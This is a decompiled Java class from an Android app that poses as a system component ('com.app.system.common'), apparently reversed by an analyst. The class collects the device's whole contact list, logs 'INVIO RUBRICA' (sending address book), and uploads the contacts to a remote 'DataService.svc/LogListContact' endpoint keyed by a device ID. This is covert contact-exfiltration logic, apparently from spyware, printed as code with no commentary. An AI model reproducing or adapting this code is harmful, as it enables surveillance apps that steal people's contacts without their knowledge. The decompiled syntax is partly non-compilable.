package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.entity.Contact;
import com.app.system.common.h;
import java.util.Date;
import java.util.List;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class f
  extends a
{
  public f(String paramString1, String paramString2)
  {
    super(paramString1, paramString2);
  }
  
  public int a(Context paramContext, List<Contact> paramList)
  {
    try
    {
      Object localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      ((StringBuilder)localObject).append("INVIO RUBRICA (tot.");
      ((StringBuilder)localObject).append(paramList.size());
      ((StringBuilder)localObject).append(")");
      h.a(paramContext, ((StringBuilder)localObject).toString());
      paramContext = h.b().a(paramList);
      if (this.b)
      {
        paramList = new java/lang/StringBuilder;
        paramList.<init>();
        paramList.append(this.c);
        paramList.append("/DataService.svc");
        paramList.append("/LogListContact");
        paramList.append("/");
        paramList.append(this.a);
        paramList.append("/");
        localObject = new java/util/Date;
        ((Date)localObject).<init>();
        paramList.append(((Date)localObject).getTimezoneOffset());
        paramContext = com.app.system.common.d.a.a.a.a(paramList.toString(), paramContext);
      }
      else
      {
        paramList = new java/lang/StringBuilder;
        paramList.<init>();
        paramList.append(this.c);
        paramList.append("/DataService.svc");
        paramList.append("/LogListContact");
        paramList.append("/");
        paramList.append(this.a);
        paramList.append("/");
        localObject = new java/util/Date;
        ((Date)localObject).<init>();
        paramList.append(((Date)localObject).getTimezoneOffset());
        paramContext = com.app.system.common.d.a.a.a.a(paramList.toString(), paramContext);
      }
      if (paramContext == null) {
        return -10;
      }
      int i = Integer.parseInt(paramContext.body().string());
      if (i <= 0) {
        return -20;
      }
      return i;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("Contact", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/f.class
 *
 * Reversed by:           J
 */